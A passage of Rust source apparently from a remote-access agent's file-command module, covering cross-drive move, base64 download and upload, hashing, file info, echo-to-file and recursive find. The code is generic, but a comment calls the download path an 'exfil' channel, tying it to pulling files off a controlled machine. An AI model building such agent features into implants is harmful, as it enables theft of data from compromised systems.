                || rename_err.kind() == std::io::ErrorKind::CrossesDevices
                || rename_err.to_string().to_lowercase().contains("cross")
                || rename_err.to_string().to_lowercase().contains("different disk");

            if is_cross_device {
                // Cross-drive: copy source → destination, then delete source
                if let Some(parent) = Path::new(&resolved_dst).parent() {
                    let _ = std::fs::create_dir_all(parent);
                }
                match std::fs::copy(&resolved_src, &resolved_dst) {
                    Ok(bytes) => {
                        match std::fs::remove_file(&resolved_src) {
                            Ok(()) => (
                                format!("[success] moved {} bytes (cross-drive): {} -> {}",
                                    bytes, resolved_src, resolved_dst),
                                String::new(),
                            ),
                            Err(e) => (
                                format!("[warn] copied {} bytes but source delete failed: {} -> {}\n  {}", bytes, resolved_src, resolved_dst, e),
                                String::new(),
                            ),
                        }
                    }
                    Err(e) => (
                        String::new(),
                        format!("mv: cross-device copy failed: {} -> {}: {}", resolved_src, resolved_dst, e),
                    ),
                }
            } else {
                (
                    String::new(),
                    format!("mv: rename {} to {}: {}", resolved_src, resolved_dst, rename_err),
                )
            }
        }
    }
}

// ============================================================
// 10. read_file — download a file as base64
// ============================================================

pub fn read_file(path: &str) -> (String, String) {
    if path.is_empty() {
        return (String::new(), "download: path required".into());
    }
    let resolved = resolve_path(path);

    // I9 FIX: was an unbounded fs::read + base64 into one String — a multi-GB
    // `download` allocated ~1.37× the file size in RAM and died (allocation
    // failure). Refuse beyond a sane cap; `cat` (1MB) covers quick peeks,
    // large exfil needs a chunked channel which doesn't exist yet.
    const DOWNLOAD_MAX: u64 = 100 * 1024 * 1024; // 100 MB
    match std::fs::metadata(&resolved) {
        Ok(m) if m.len() > DOWNLOAD_MAX => {
            return (
                String::new(),
                format!(
                    "download: file too large ({} bytes, cap is {} bytes) — use smaller files",
                    m.len(),
                    DOWNLOAD_MAX
                ),
            );
        }
        Err(e) => {
            return (
                String::new(),
                format!("download: failed to stat file {}: {}", resolved, e),
            );
        }
        Ok(_) => {}
    }

    let data = match std::fs::read(&resolved) {
        Ok(d) => d,
        Err(e) => {
            return (
                String::new(),
                format!("download: failed to read file {}: {}", resolved, e),
            );
        }
    };

    let size = data.len();
    let encoded = crate::core_agent::commu::comms::base64_encode(&data);

    (
        format!(
            "[download] file: {}\n[size] {} bytes\n[encoding] base64\n[data]\n{}",
            resolved, size, encoded
        ),
        String::new(),
    )
}

// ============================================================
// 11. write_file — upload/write base64 data to file
// ============================================================

pub fn write_file(path: &str, b64_data: &str) -> (String, String) {
    if path.is_empty() {
        return (String::new(), "upload: path required".into());
    }
    let resolved = resolve_path(path);

    let data = match crate::core_agent::commu::comms::base64_decode(b64_data) {
        Some(d) => d,
        None => {
            return (String::new(), "upload: invalid base64 data".into());
        }
    };

    // Create parent directories if needed
    if let Some(parent) = Path::new(&resolved).parent() {
        let _ = std::fs::create_dir_all(parent);
    }

    match std::fs::write(&resolved, &data) {
        Ok(_) => (
            format!("[success] uploaded {} bytes to: {}", data.len(), resolved),
            String::new(),
        ),
        Err(e) => (String::new(), format!("upload: failed to write {}: {}", resolved, e)),
    }
}

// ============================================================
// 12. hash_file — hash a file (MD5, SHA1, SHA256)
//
// Usage: hash <file>          → all hashes
//        hash md5 <file>      → MD5 only
//        hash sha1 <file>     → SHA1 only
//        hash sha256 <file>   → SHA256 only
//
// Called from mod.rs as hash_file(p) where p = ia.path.
// The path may contain just a filename or "algo filename".
// ============================================================

pub fn hash_file(args: &str) -> (String, String) {
    let input = args.trim();
    if input.is_empty() {
        return (
            String::new(),
            "hash: filename required (usage: hash [md5|sha1|sha256] <file>)".into(),
        );
    }

    // Parse: detect if first token is a known algorithm
    let tokens: Vec<&str> = input.split_whitespace().collect();
    let (algo, file_path) = if tokens.len() >= 2 {
        let first = tokens[0].to_lowercase();
        match first.as_str() {
            "md5" | "sha1" | "sha256" => {
                // Remaining tokens form the path (might have spaces)
                let path_str = tokens[1..].join(" ");
                (first, path_str)
            }
            _ => {
                // First token is not an algo — it's the filename
                ("all".to_string(), input.to_string())
            }
        }
    } else {
        // Single token — compute all hashes
        ("all".to_string(), input.to_string())
    };

    let resolved = resolve_path(&file_path);

    let data = match std::fs::read(&resolved) {
        Ok(d) => d,
        Err(e) => {
            return (
                String::new(),
                format!("hash: open {}: {}", resolved, e),
            );
        }
    };

    let size = data.len();
    let mut out = format!("File: {}\nSize: {} bytes\n\n", resolved, size);

    if algo == "md5" || algo == "all" {
        let hash = md5_hash(&data);
        out.push_str(&format!("MD5:    {}\n", hex_encode(&hash)));
    }
    if algo == "sha1" || algo == "all" {
        let hash = sha1_hash(&data);
        out.push_str(&format!("SHA1:   {}\n", hex_encode(&hash)));
    }
    if algo == "sha256" || algo == "all" {
        use sha2::{Sha256, Digest};
        let hash = Sha256::digest(&data);
        out.push_str(&format!("SHA256: {}\n", hex_encode(&hash)));
    }

    // Trim trailing newline for clean output
    let out = out.trim_end().to_string();
    (out, String::new())
}

// ============================================================
// 13. b64enc — base64 encode a file
// ============================================================

pub fn b64enc(args: &str) -> (String, String) {
    let path = args.trim();
    if path.is_empty() {
        return (String::new(), "b64encode: filename required".into());
    }

    let resolved = resolve_path(path);
    let data = match std::fs::read(&resolved) {
        Ok(d) => d,
        Err(e) => {
            return (
                String::new(),
                format!("b64encode: read {}: {}", resolved, e),
            );
        }
    };

    let encoded = crate::core_agent::commu::comms::base64_encode(&data);

    let out = format!(
        "File: {}\nSize: {} bytes\nEncoded size: {} bytes\n\n{}",
        resolved,
        data.len(),
        encoded.len(),
        encoded
    );
    (out, String::new())
}

// ============================================================
// 14. b64dec — base64 decode a file and write output
//
// Usage: b64decode <input.b64> [output.bin]
// If no output specified, strips .b64/.base64 extension.
// ============================================================

pub fn b64dec(args: &str) -> (String, String) {
    let parts = smart_split(args);
    if parts.is_empty() || parts[0].trim().is_empty() {
        return (
            String::new(),
            "b64decode: input file required (usage: b64decode <input.b64> <output.bin>)".into(),
        );
    }

    let input_path = resolve_path(parts[0]);

    // Determine output path
    let output_path = if parts.len() > 1 && !parts[1].trim().is_empty() {
        resolve_path(parts[1])
    } else {
        // Default: strip .b64/.base64 extension, or append .decoded
        let base = parts[0].trim();
        let default_name = if base.ends_with(".b64") {
            &base[..base.len() - 4]
        } else if base.ends_with(".base64") {
            &base[..base.len() - 7]
        } else {
            base
        };
        if default_name == base {
            resolve_path(&(base.to_string() + ".decoded"))
        } else {
            resolve_path(default_name)
        }
    };

    // Read base64 data from input file
    let b64_raw = match std::fs::read(&input_path) {
        Ok(d) => d,
        Err(e) => {
            return (
                String::new(),
                format!("b64decode: read {}: {}", input_path, e),
            );
        }
    };

    let b64_text = String::from_utf8_lossy(&b64_raw);
    let decoded = match crate::core_agent::commu::comms::base64_decode(b64_text.trim()) {
        Some(d) => d,
        None => {
            return (String::new(), "b64decode: invalid base64 data".into());
        }
    };

    match std::fs::write(&output_path, &decoded) {
        Ok(_) => (
            format!(
                "[success] decoded {} bytes from {} to {}",
                decoded.len(),
                input_path,
                output_path
            ),
            String::new(),
        ),
        Err(e) => (
            String::new(),
            format!("b64decode: write {}: {}", output_path, e),
        ),
    }
}

// ============================================================
// 15. file_info — detailed file metadata
// ============================================================

pub fn file_info(path: &str) -> (String, String) {
    if path.is_empty() {
        return (String::new(), "fileinfo: path required".into());
    }
    let resolved = resolve_path(path);

    let meta = match std::fs::metadata(&resolved) {
        Ok(m) => m,
        Err(e) => {
            return (
                String::new(),
                format!("fileinfo: failed to stat {}: {}", resolved, e),
            );
        }
    };

    let name = Path::new(&resolved)
        .file_name()
        .map(|n| n.to_string_lossy().to_string())
        .unwrap_or_else(|| resolved.clone());

    let file_type = if meta.is_dir() {
        "directory"
    } else if meta.is_file() {
        "regular file"
    } else if meta.is_symlink() {
        "symlink"
    } else {
        "other"
    };

    let modified = meta
        .modified()
        .ok()
        .map(format_ps_time)
        .unwrap_or_else(|| "-".to_string());

    let accessed = meta
        .accessed()
        .ok()
        .map(format_ps_time)
        .unwrap_or_else(|| "-".to_string());

    let readonly = meta.permissions().readonly();

    let mut out = format!(
        "Path:       {}\n\
         Name:       {}\n\
         Size:       {} bytes\n\
         Type:       {}\n\
         Modified:   {}\n\
         Accessed:   {}\n\
         Readonly:   {}\n",
        resolved, name, meta.len(), file_type, modified, accessed, readonly
    );

    if meta.is_file() {
        if let Some(ext) = Path::new(&resolved).extension() {
            out.push_str(&format!("Extension:  {}\n", ext.to_string_lossy()));
        }
    }

    // Trim trailing whitespace/newlines
    (out.trim_end().to_string(), String::new())
}

// ============================================================
// 16. echo_write — write/append text to file
// Called from mod.rs echo handler (or can be called directly).
// mode: "write" (truncate) or "append"
// ============================================================

pub fn echo_write(text: &str, filename: &str, mode: &str) -> (String, String) {
    if filename.trim().is_empty() {
        return (
            String::new(),
            "echo: filename required (use: echo text > filename)".into(),
        );
    }

    let resolved = resolve_path(filename);

    let is_append = mode.to_lowercase() == "append";

    use std::io::Write;

    let result = if is_append {
        std::fs::OpenOptions::new()
            .create(true)
            .append(true)
            .open(&resolved)
            .and_then(|mut f| f.write_all(text.as_bytes()).and_then(|_| f.write_all(b"\n")))
    } else {
        std::fs::write(&resolved, format!("{}\n", text)).map(|_| ())
    };

    match result {
        Ok(()) => {
            let action = if is_append { "appended" } else { "wrote" };
            (
                format!(
                    "[success] {} {} bytes to: {}",
                    action,
                    text.len(),
                    resolved
                ),
                String::new(),
            )
        }
        Err(e) => (String::new(), format!("echo: write failed: {}", e)),
    }
}

// ============================================================
// 17. find_files — find files by pattern using recursive walk
//
// Usage: find <pattern> [startDir]
// Max 500 results.
// ============================================================

pub fn find_files(args: &str) -> (String, String) {
    let parts = smart_split(args);

    let (pattern, start_dir) = if parts.is_empty() {
        ("*".to_string(), String::new())
    } else if parts.len() == 1 {
        (parts[0].to_string(), String::new())
    } else {
        (parts[0].to_string(), parts[1].to_string())
    };

    let search_dir = if start_dir.is_empty() {
        get_cwd()
    } else {
        resolve_path(&start_dir)
    };

    // Verify start directory exists and is a directory
    match std::fs::metadata(&search_dir) {
        Ok(meta) => {
            if !meta.is_dir() {
                return (
                    String::new(),
                    format!("find: not a directory: {}", search_dir),
                );
            }
        }
        Err(e) => {
            return (
                String::new(),
                format!("find: start dir not found: {} ({})", search_dir, e),
            );
        }
    }

    let max_results: usize = 500;
    let mut results: Vec<String> = Vec::new();
    let mut count = 0usize;

    // Recursive directory walk
    fn walk_dir(
        dir: &Path,
        pattern: &str,
        results: &mut Vec<String>,
        count: &mut usize,
        max: usize,
    ) {
        if *count >= max {
            return;
        }

        let entries = match std::fs::read_dir(dir) {
            Ok(e) => e,
            Err(_) => return,
        };

        let mut subdirs: Vec<PathBuf> = Vec::new();

        for entry in entries.flatten() {
            if *count >= max {
                break;
            }

            let path = entry.path();
            let name = entry.file_name().to_string_lossy().to_string();
            let is_dir = path.is_dir();

            let is_match = match glob_match(pattern, &name) {
                Ok(m) => m,
                Err(_) => false,
            };

            if is_match {
                let rel = path
                    .strip_prefix(dir)
                    .map(|p| p.display().to_string())
                    .unwrap_or_else(|_| path.display().to_string());

                if is_dir {
                    results.push(format!("{}/", rel));
                } else {
                    let size = entry.metadata().map(|m| m.len()).unwrap_or(0);
                    results.push(format!("{:<50} {:>12}", rel, size));
                }
                *count += 1;
            }

            // Always collect subdirectories for recursion (matching Go's filepath.Walk)
            if is_dir {
                subdirs.push(path);
            }
        }

        // Recurse into subdirectories
        for subdir in subdirs {
            if *count >= max {
                break;
            }
            walk_dir(&subdir, pattern, results, count, max);
        }
    }

    walk_dir(
        Path::new(&search_dir),
        &pattern,
        &mut results,
        &mut count,
        max_results,
    );

    if results.is_empty() {
        return (
            format!(
                "No files matching '{}' in {}",
                pattern, search_dir
            ),
            String::new(),
        );
    }

    let mut out = format!(
        "Find: '{}' in {}\n{}\n",
        pattern,
        search_dir,
        "-".repeat(70)
    );
    for r in &results {
        out.push_str(&format!("  {}\n", r));
    }
    out.push_str(&format!("\n{} match(es) found", count));
    if count >= max_results {
        out.push_str(" (truncated at 500)");
    }

    (out, String::new())
}

// ============================================================
// Simple glob pattern matcher (supports * and ?)
// ============================================================

fn glob_match(pattern: &str, text: &str) -> Result<bool, ()> {
    let p: Vec<char> = pattern.chars().collect();
    let t: Vec<char> = text.chars().collect();
    let mut pi = 0usize;
    let mut ti = 0usize;
    let mut star_pi = 0usize;
    let mut star_ti = 0usize;
    let mut star = false;

    while ti < t.len() {
        if pi < p.len() && (p[pi] == '?' || p[pi] == t[ti]) {
            pi += 1;
            ti += 1;
        } else if pi < p.len() && p[pi] == '*' {
            star = true;
            star_pi = pi;
            star_ti = ti;
            pi += 1;
        } else if star {
            pi = star_pi + 1;
            star_ti += 1;
            ti = star_ti;
        } else {
            return Ok(false);
        }
    }

    // Consume trailing stars
    while pi < p.len() && p[pi] == '*' {
        pi += 1;
    }

    Ok(pi == p.len())
}